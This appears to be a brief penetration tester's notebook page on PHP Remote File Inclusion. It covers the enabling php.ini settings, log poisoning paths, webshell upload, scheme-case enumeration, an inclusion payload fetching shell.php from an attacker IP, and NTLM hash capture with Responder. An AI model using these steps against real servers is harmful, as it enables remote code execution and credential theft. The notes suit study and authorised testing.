# Manual

## Remote File Inclusion (RFI)

### Conditions

```
$ cat /etc/php/7.4/apache2/php.ini
..[snip]..
allow_url_fopen = On
allow_url_include = On
..[snip]..
```

- Poison log files to insert payload

```
/var/log/apache/access.log
/var/log/nginx/error_log
/var/log/auth.log
```

- Send via email

- Upload a webshell in a vulnerable file upload form

### General

#### Enumeration

```
https://google.com
HTTPS://google.com
httPs://google.com
```

#### Exploit

Note: Look at `phpinfo()` for `disabled_functions`. If there are then check **hacktricks** in the reference links below.

```
http://<attacker_IP>/shell.php
```

### Windows

#### Exploit

- Grab NTLM hashes with Responder (out of band)

---
## References

- [Hacking Articles: Comprehensive Guide on Local File Inclusion (LFI)](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)

- [Hacking Articles: RCE with LFI and SSH Log Poisoning](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

- [Local File Inclusion Code Execution](https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/)

- [Hacktricks: PHP - Useful Functions & disable_functions/open_basedir bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)

- [File Inclusion (Local/Remote)](https://notes.defendergb.org/web-sec/vuln/lfi-rfi)

- [SecurityIdiots: Guide to LFI](https://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)

- [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)